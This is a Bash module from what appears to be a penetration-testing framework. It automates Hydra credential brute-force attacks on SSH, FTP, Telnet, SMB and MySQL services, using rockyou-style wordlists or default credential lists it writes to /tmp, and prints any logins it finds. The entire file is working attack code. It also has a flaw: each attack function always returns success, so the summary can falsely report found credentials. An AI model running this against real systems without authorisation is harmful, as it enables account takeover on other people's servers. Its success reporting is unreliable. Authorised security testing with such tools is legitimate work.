#!/bin/bash
# modules/hydra.sh - Hydra Brute Force Module
# Version: 2.0

set -euo pipefail

source "$(dirname "${BASH_SOURCE[0]}")/../lib/utils.sh"

MODULE_NAME="HYDRA"
MODULE_VERSION="2.0"

# Check if hydra is available
function hydra_check() {
    if ! command -v hydra &>/dev/null; then
        log_warning "[$MODULE_NAME] Hydra not installed"
        return 1
    fi
    
    log_success "[$MODULE_NAME] Hydra available"
    return 0
}

# Get default wordlists
function hydra_get_wordlists() {
    local userlist=""
    local passlist=""
    
    # Find user list
    if [ -f "/usr/share/ncrack/default.usr" ]; then
        userlist="/usr/share/ncrack/default.usr"
    elif [ -f "/usr/share/wordlists/metasploit/unix_users.txt" ]; then
        userlist="/usr/share/wordlists/metasploit/unix_users.txt"
    else
        # Create minimal default user list
        userlist="/tmp/default_users.txt"
        cat > "$userlist" << 'EOF'
root
admin
administrator
user
guest
test
EOF
    fi
    
    # Find password list
    if [ -f "/usr/share/wordlists/rockyou.txt" ]; then
        passlist="/usr/share/wordlists/rockyou.txt"
    elif [ -f "/usr/share/wordlists/fasttrack.txt" ]; then
        passlist="/usr/share/wordlists/fasttrack.txt"
    else
        # Create minimal default password list
        passlist="/tmp/default_pass.txt"
        cat > "$passlist" << 'EOF'
password
admin
root
123456
password123
admin123
EOF
    fi
    
    echo "$userlist:$passlist"
}

# SSH brute force
function hydra_ssh_bruteforce() {
    local target="$1"
    local output_dir="$2"
    local threads="${3:-4}"
    
    log_info "[$MODULE_NAME] Starting SSH brute force on: $target"
    
    local wordlists
    wordlists=$(hydra_get_wordlists)
    local userlist="${wordlists%%:*}"
    local passlist="${wordlists##*:}"
    
    local output_file="${output_dir}/ssh_bruteforce.txt"
    
    log_info "[$MODULE_NAME] Using userlist: $userlist"
    log_info "[$MODULE_NAME] Using passlist: $passlist"
    log_warning "[$MODULE_NAME] This may take a while..."
    
    # Use timeout wrapper with progress
    if run_with_timeout 600 "Hydra-SSH" \
        hydra -t "$threads" -I -L "$userlist" -P "$passlist" \
        "ssh://${target}" -o "$output_file" 2>&1 | tee -a "${output_file}.log"; then
        
        if grep -q "login:" "$output_file" 2>/dev/null; then
            log_success "[$MODULE_NAME] SSH credentials found!"
            grep "login:" "$output_file" | head -5
        else
            log_info "[$MODULE_NAME] No SSH credentials found"
        fi
    else
        log_warning "[$MODULE_NAME] SSH brute force timeout or error"
    fi
    
    return 0
}

# FTP brute force
function hydra_ftp_bruteforce() {
    local target="$1"
    local output_dir="$2"
    local threads="${3:-4}"
    
    log_info "[$MODULE_NAME] Starting FTP brute force on: $target"
    
    local wordlists
    wordlists=$(hydra_get_wordlists)
    local userlist="${wordlists%%:*}"
    local passlist="${wordlists##*:}"
    
    local output_file="${output_dir}/ftp_bruteforce.txt"
    
    # Use timeout wrapper with progress
    if run_with_timeout 600 "Hydra-FTP" \
        hydra -t "$threads" -I -L "$userlist" -P "$passlist" \
        "ftp://${target}" -o "$output_file" 2>&1 | tee -a "${output_file}.log"; then
        
        if grep -q "login:" "$output_file" 2>/dev/null; then
            log_success "[$MODULE_NAME] FTP credentials found!"
            grep "login:" "$output_file" | head -5
        else
            log_info "[$MODULE_NAME] No FTP credentials found"
        fi
    else
        log_warning "[$MODULE_NAME] FTP brute force timeout or error"
    fi
    
    return 0
}

# Telnet brute force
function hydra_telnet_bruteforce() {
    local target="$1"
    local output_dir="$2"
    local threads="${3:-4}"
    
    log_info "[$MODULE_NAME] Starting Telnet brute force on: $target"
    
    local wordlists
    wordlists=$(hydra_get_wordlists)
    local userlist="${wordlists%%:*}"
    local passlist="${wordlists##*:}"
    
    local output_file="${output_dir}/telnet_bruteforce.txt"
    
    # Use timeout wrapper with progress
    if run_with_timeout 600 "Hydra-Telnet" \
        hydra -t "$threads" -I -L "$userlist" -P "$passlist" \
        "telnet://${target}" -o "$output_file" 2>&1 | tee -a "${output_file}.log"; then
        
        if grep -q "login:" "$output_file" 2>/dev/null; then
            log_success "[$MODULE_NAME] Telnet credentials found!"
            grep "login:" "$output_file" | head -5
        else
            log_info "[$MODULE_NAME] No Telnet credentials found"
        fi
    else
        log_warning "[$MODULE_NAME] Telnet brute force timeout or error"
    fi
    
    return 0
}

# SMB brute force
function hydra_smb_bruteforce() {
    local target="$1"
    local output_dir="$2"
    local threads="${3:-4}"
    
    log_info "[$MODULE_NAME] Starting SMB brute force on: $target"
    
    local wordlists
    wordlists=$(hydra_get_wordlists)
    local userlist="${wordlists%%:*}"
    local passlist="${wordlists##*:}"
    
    local output_file="${output_dir}/smb_bruteforce.txt"
    
    # Use timeout wrapper with progress
    if run_with_timeout 600 "Hydra-SMB" \
        hydra -t "$threads" -I -L "$userlist" -P "$passlist" \
        "smb://${target}" -o "$output_file" 2>&1 | tee -a "${output_file}.log"; then
        
        if grep -q "login:" "$output_file" 2>/dev/null; then
            log_success "[$MODULE_NAME] SMB credentials found!"
            grep "login:" "$output_file" | head -5
        else
            log_info "[$MODULE_NAME] No SMB credentials found"
        fi
    else
        log_warning "[$MODULE_NAME] SMB brute force timeout or error"
    fi
    
    return 0
}

# MySQL brute force
function hydra_mysql_bruteforce() {
    local target="$1"
    local output_dir="$2"
    local threads="${3:-4}"
    
    log_info "[$MODULE_NAME] Starting MySQL brute force on: $target"
    
    local wordlists
    wordlists=$(hydra_get_wordlists)
    local userlist="${wordlists%%:*}"
    local passlist="${wordlists##*:}"
    
    local output_file="${output_dir}/mysql_bruteforce.txt"
    
    # Use timeout wrapper with progress
    if run_with_timeout 600 "Hydra-MySQL" \
        hydra -t "$threads" -I -L "$userlist" -P "$passlist" \
        "mysql://${target}" -o "$output_file" 2>&1 | tee -a "${output_file}.log"; then
        
        if grep -q "login:" "$output_file" 2>/dev/null; then
            log_success "[$MODULE_NAME] MySQL credentials found!"
            grep "login:" "$output_file" | head -5
        else
            log_info "[$MODULE_NAME] No MySQL credentials found"
        fi
    else
        log_warning "[$MODULE_NAME] MySQL brute force timeout or error"
    fi
    
    return 0
}

# Main hydra module runner
function hydra_module_main() {
    local target="$1"
    local output_dir="$2"
    local enable_bruteforce="${3:-false}"
    
    if ! hydra_check; then
        log_warning "[$MODULE_NAME] Skipping - Hydra not available"
        return 0
    fi
    
    if [ "$enable_bruteforce" != "true" ]; then
        log_info "[$MODULE_NAME] Brute force disabled - use --bruteforce flag to enable"
        return 0
    fi
    
    log_info "[$MODULE_NAME] Starting Hydra module for: $target"
    log_warning "[$MODULE_NAME] Brute force attacks enabled - use responsibly!"
    
    # Create hydra output directory
    local hydra_dir="${output_dir}/hydra"
    safe_create_dir "$hydra_dir"
    
    # Check services file to determine which services to brute force
    local services_file="${output_dir}/services.txt"
    
    if [ ! -f "$services_file" ]; then
        log_warning "[$MODULE_NAME] No services file found, skipping"
        return 0
    fi
    
    local attack_count=0
    local success_count=0
    
    # Parse services and run appropriate brute force attacks
    while IFS= read -r service; do
        case "$service" in
            ssh|ssh-*)
                hydra_ssh_bruteforce "$target" "$hydra_dir" && success_count=$((success_count + 1)) || true
                attack_count=$((attack_count + 1))
                ;;
            ftp|ftp-*)
                hydra_ftp_bruteforce "$target" "$hydra_dir" && success_count=$((success_count + 1)) || true
                attack_count=$((attack_count + 1))
                ;;
            telnet)
                hydra_telnet_bruteforce "$target" "$hydra_dir" && success_count=$((success_count + 1)) || true
                attack_count=$((attack_count + 1))
                ;;
            smb|microsoft-ds|netbios-ssn)
                hydra_smb_bruteforce "$target" "$hydra_dir" && success_count=$((success_count + 1)) || true
                attack_count=$((attack_count + 1))
                ;;
            mysql|mariadb)
                hydra_mysql_bruteforce "$target" "$hydra_dir" && success_count=$((success_count + 1)) || true
                attack_count=$((attack_count + 1))
                ;;
        esac
    done < "$services_file"
    
    # Generate summary
    hydra_generate_summary "$target" "$hydra_dir" "$attack_count" "$success_count"
    
    log_success "[$MODULE_NAME] Hydra module completed for: $target"
    log_info "[$MODULE_NAME] Results saved in: $hydra_dir"
    log_info "[$MODULE_NAME] Attacks attempted: $attack_count"
    if [ $success_count -gt 0 ]; then
        log_warning "[$MODULE_NAME] Credentials found in $success_count service(s)!"
    fi
    
    return 0
}

# Generate Hydra summary
function hydra_generate_summary() {
    local target="$1"
    local output_dir="$2"
    local attack_count="$3"
    local success_count="$4"
    local summary_file="${output_dir}/hydra_summary.txt"
    
    {
        echo "=========================================="
        echo "Hydra Brute Force Summary"
        echo "=========================================="
        echo "Target: $target"
        echo "Date: $(date '+%Y-%m-%d %H:%M:%S')"
        echo "Attacks Attempted: $attack_count"
        echo "Successful: $success_count"
        echo ""
        
        if [ $success_count -gt 0 ]; then
            echo "⚠️ CREDENTIALS FOUND ⚠️"
            echo ""
            for bf_file in "$output_dir"/*_bruteforce.txt; do
                [ -f "$bf_file" ] || continue
                if grep -q "login:" "$bf_file" 2>/dev/null; then
                    local service
                    service=$(basename "$bf_file" _bruteforce.txt)
                    echo "Service: $service"
                    grep "login:" "$bf_file" | head -10
                    echo ""
                fi
            done
        else
            echo "No credentials found in brute force attacks"
        fi
        
        echo ""
        echo "Detailed Results:"
        for bf_file in "$output_dir"/*_bruteforce.txt; do
            [ -f "$bf_file" ] || continue
            local service
            service=$(basename "$bf_file" _bruteforce.txt)
            echo "  - $service: $bf_file"
        done
    } > "$summary_file"
    
    log_info "[$MODULE_NAME] Summary generated: $summary_file"
    
    # Display found credentials immediately
    if [ $success_count -gt 0 ]; then
        echo ""
        log_warning "[$MODULE_NAME] ==================== CREDENTIALS FOUND ===================="
        grep "login:" "$output_dir"/*_bruteforce.txt 2>/dev/null | head -10 || true
        log_warning "[$MODULE_NAME] =========================================================="
        echo ""
    fi
}

# Export functions
export -f hydra_check hydra_get_wordlists
export -f hydra_ssh_bruteforce hydra_ftp_bruteforce hydra_telnet_bruteforce
export -f hydra_smb_bruteforce hydra_mysql_bruteforce
export -f hydra_generate_summary hydra_module_main
